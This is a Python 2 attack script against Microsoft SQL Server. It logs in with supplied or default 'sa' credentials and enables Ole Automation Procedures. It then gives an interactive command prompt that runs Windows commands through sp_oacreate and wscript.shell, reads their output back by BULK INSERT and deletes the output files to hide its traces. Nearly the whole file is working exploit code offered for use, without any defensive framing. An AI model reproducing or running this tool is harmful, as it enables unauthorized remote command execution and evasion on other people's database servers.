#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-

import _mssql
import random
import string
import argparse

class MSSQL:
    def __init__(self, host, user, pwd, db):
        self.host = host
        self.user = user
        self.pwd = pwd
        self.db = db

    def __GetConnect(self):
        """
        得到连接信息
        返回: conn.cursor()
        """
        try:
            self.conn = _mssql.connect(
                server=self.host,
                user=self.user,
                password=self.pwd,
                database=self.db,
                charset="utf8")
        except Exception as e:
            raise "数据库访问失败，%s" % e
        return self.conn


    def mssql_exec(self, sql):
        """
        执行mssql查询语句;
        """
        resList = []
        cur = self.__GetConnect()
        cur.execute_query(sql)
        for i in cur:
            resList.append(i)
        self.conn.close()
        return resList

    def mssql_ocreate(self):
        """
        开启sp_oacreate:
            EXEC sp_configure 'show advanced options', 1;
            RECONFIGURE WITH OVERRIDE;
            EXEC sp_configure 'Ole Automation Procedures', 1;
            RECONFIGURE WITH OVERRIDE;
            EXEC sp_configure 'show advanced options', 0;
        """
        try:
            self.mssql_exec(
                sql="EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'Ole Automation Procedures', 1;"
                    "RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;")
        except Exception as e:
            raise "Failure to open sp_configure，%s" % e


    def mssql_load(self,filename):
        """
        将执行命令重定向到txt文件
        插入数据表，查询读取并删除痕迹
        """
        self.mssql_exec(
            sql="""
        create table {whoami}(a text);
        BULK INSERT {whoami}
        FROM 'C:/{whoami}.txt'
        WITH (
        FIELDTERMINATOR = 'n',
        ROWTERMINATOR = 'nn')""".format(whoami=filename))
        load = "select * from {}".format(filename)
        content = self.mssql_exec(load)
        dbname ='C:\\{}.txt'.format(filename)
        del_sql='declare @shell int exec sp_oacreate "wscript.shell",@shell output exec sp_oamethod @shell,"run",null,'\
            +'"c:\windows\system32\cmd.exe /c del {}"'.format(dbname)
        self.mssql_exec(del_sql)
        return content

    def mssql_rce(self):
        try:
            command =raw_input("C:\Windows\system32> ")
            if command == 'exit':
                exit()
            ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
            rce  ='{} >C:\\{}.txt'.format(command,ran_str)
            getsql='declare @shell int exec sp_oacreate "wscript.shell",@shell output exec sp_oamethod @shell,"run",null,'\
                +'"c:\windows\system32\cmd.exe /c {}"'.format(rce)
            print getsql
            status = self.mssql_exec(getsql)
            result = self.mssql_load(ran_str)
            print result[0][0]
            if status[0][0] ==0:
                while True:
                    self.mssql_rce()
        except Exception :
            print 'Command execution succeeded,but no echo'

if __name__ == '__main__':
    parse = argparse.ArgumentParser(description="")
    parse.add_argument('-r','--host', type=str, help="RHOST")
    parse.add_argument('-o','--port', type=int, help="RPORT",default=1433)
    parse.add_argument('-u', '--user', type=str, help="USERNAME",default="sa")
    parse.add_argument('-p', '--passwd', type=str, help="PASSWOD", default='123456')
    args = parse.parse_args()
    if not args.host:
        parse.print_help()
    else:
        mysql_host = args.host
        mysql_passwd = args.passwd
        mysql_port = args.port
        mysql_user = args.user
        ms = MSSQL(host=mysql_host, user="sa", pwd=mysql_passwd, db="tempdb")
        ms.mssql_rce()